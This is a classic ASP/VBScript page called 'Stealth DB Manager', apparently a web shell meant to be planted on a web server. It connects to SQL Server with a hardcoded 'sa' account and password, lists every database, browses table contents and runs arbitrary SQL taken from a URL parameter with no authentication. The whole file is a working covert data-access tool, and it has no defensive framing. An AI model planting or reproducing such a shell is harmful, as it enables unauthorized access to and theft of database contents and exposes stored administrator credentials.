<%@ Language=VBScript %>
<%
' Stealth DB Manager - All Databases Support (Fixed)

Dim Conn, RS, ConnStr, ErrMsg
Dim srv, dbn, usr, pwd, act, qry, tbl, selectedDB

' Default credentials (change if needed)
srv = "ATT-N-ACC"   ' ya IP daal agar better chal raha hai
usr = "sa"
pwd = "HRPass123"

selectedDB = Request("db")   ' selected database from dropdown or link
act = Request("act")
qry = Request("query")
tbl = Request("tbl")

' Connection string (master se connect karenge pehle)
ConnStr = "Provider=SQLNCLI11;Server=tcp:" & srv & ",1433;Database=master;Uid=" & usr & ";Pwd=" & pwd & ";"

Set Conn = Server.CreateObject("ADODB.Connection")
On Error Resume Next
Conn.Open ConnStr
If Err.Number <> 0 Then
    Response.Write "<div style='color:red; background:#300; padding:15px;'>Connection Failed: " & Err.Description & "</div>"
    Response.End
End If
On Error Goto 0
%>

<html>
<head><title>Stealth DB Manager - All DBs</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; padding:20px;">

<h2>Connected to SQL Server (sa / HRPass123)</h2>

<!-- Database List -->
<h3>All Databases (click to view tables)</h3>
<%
Set RS = Conn.Execute("SELECT name FROM sys.databases WHERE database_id > 4 ORDER BY name")
Do While Not RS.EOF
    Dim dbName : dbName = RS("name")
    Response.Write "<a href='?db=" & Server.URLEncode(dbName) & "' style='color:#ff0;'>" & dbName & "</a><br>"
    RS.MoveNext
Loop
RS.Close
%>

<% If selectedDB <> "" Then %>
    <h3>Selected Database: <%=Server.HTMLEncode(selectedDB)%></h3>

    <!-- Tables in selected DB -->
    <h4>Tables</h4>
    <%
    On Error Resume Next
    Conn.Execute "USE [" & selectedDB & "]"
    If Err.Number <> 0 Then
        Response.Write "<div style='color:red;'>USE [" & selectedDB & "] failed: " & Err.Description & "</div>"
    Else
        Set RS = Conn.Execute("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' ORDER BY TABLE_NAME")
        If Err.Number <> 0 Then
            Response.Write "<div style='color:red;'>Tables query failed: " & Err.Description & "</div>"
        ElseIf RS.EOF Then
            Response.Write "<div style='color:yellow;'>No tables found or no access.</div>"
        Else
            Do While Not RS.EOF
                Dim tblName : tblName = RS("TABLE_NAME")
                Response.Write "<a href='?db=" & Server.URLEncode(selectedDB) & "&act=browse&tbl=" & Server.URLEncode(tblName) & "' style='color:#0ff;'>" & tblName & "</a><br>"
                RS.MoveNext
            Loop
        End If
        RS.Close
    End If
    On Error Goto 0
    %>
<% End If %>

<!-- Custom Query -->
<h3>Custom Query (any DB)</h3>
<form method="get">
    <input type="hidden" name="db" value="<%=Server.URLEncode(selectedDB)%>">
    Query: <input name="query" size="90" value="SELECT name FROM sys.tables"><br><br>
    <input type="submit" value="Run">
</form>

<% If qry <> "" Then %>
    <h4>Query Result:</h4>
    <%
    On Error Resume Next
    Set RS = Conn.Execute(qry)
    If Err.Number <> 0 Then
        Response.Write "<div style='color:red;'>Query failed: " & Err.Description & "</div>"
    ElseIf Not RS.EOF Then
        Response.Write "<table border='1' style='border-color:#0f0;'>"
        Response.Write "<tr>"
        For Each fld In RS.Fields
            Response.Write "<th>" & fld.Name & "</th>"
        Next
        Response.Write "</tr>"
        Do While Not RS.EOF
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
            Next
            Response.Write "</tr>"
            RS.MoveNext
        Loop
        Response.Write "</table>"
    Else
        Response.Write "<div style='color:yellow;'>Query OK (no rows or non-select query).</div>"
    End If
    RS.Close
    On Error Goto 0
    %>
<% End If %>

<!-- Browse Table -->
<% If act = "browse" And selectedDB <> "" And tbl <> "" Then %>
    <h3>Data from <%=Server.HTMLEncode(tbl)%> in <%=selectedDB%> (top 50 rows)</h3>
    <%
    On Error Resume Next
    Conn.Execute "USE [" & selectedDB & "]"
    Set RS = Conn.Execute("SELECT TOP 50 * FROM [" & tbl & "]")
    If Err.Number <> 0 Then
        Response.Write "<div style='color:red;'>Browse failed: " & Err.Description & "</div>"
    ElseIf Not RS.EOF Then
        Response.Write "<table border='1' style='border-color:#0f0;'>"
        Response.Write "<tr>"
        For Each fld In RS.Fields
            Response.Write "<th>" & fld.Name & "</th>"
        Next
        Response.Write "</tr>"
        Do While Not RS.EOF
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
            Next
            Response.Write "</tr>"
            RS.MoveNext
        Loop
        Response.Write "</table>"
    Else
        Response.Write "<div style='color:yellow;'>Table khali ya no select permission.</div>"
    End If
    RS.Close
    On Error Goto 0
    %>
<% End If %>

<p style="color:#888;">
Tips:<br>
- Click on database name to see its tables.<br>
- Click on table name to see data.<br>
- Custom query mein database change karne ke liye USE [dbname] add kar sakta hai.<br>
- Agar permission denied aaye to sa user ko sysadmin role dena padega (GRANT sysadmin TO sa).
</p>

</body>
</html>

<%
If IsObject(RS) Then RS.Close
If IsObject(Conn) Then Conn.Close
%>
